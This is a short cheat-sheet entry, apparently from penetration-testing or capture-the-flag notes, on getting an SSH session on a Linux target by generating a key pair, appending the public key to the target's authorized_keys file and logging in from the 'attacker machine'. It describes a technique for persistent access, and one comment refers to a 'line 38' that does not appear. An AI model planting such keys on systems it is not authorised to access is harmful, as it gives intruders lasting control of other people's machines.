# Adding SSH Public key

- This can be used to get ssh session, on target machine which is based on linux

```bash
# defaults are typically fine, but you can fine-tune line 38 to your liking
# I generally don't like adding a passphrase, but you can if you insist.
ssh-keygen

# This created both id_rsa and id_rsa.pub in ~/.ssh directory
# Copy the content in "id_rsa.pub" to "authorized_keys" in the ".ssh" directory in /home of target machine.
cat id_rsa.pub >> authorized_keys

# On Attacker machine, give copied private key 600 permissions. You should be able to log in now.
chmod 600 id_rsa
ssh username@target_ip -i id_rsa 
```
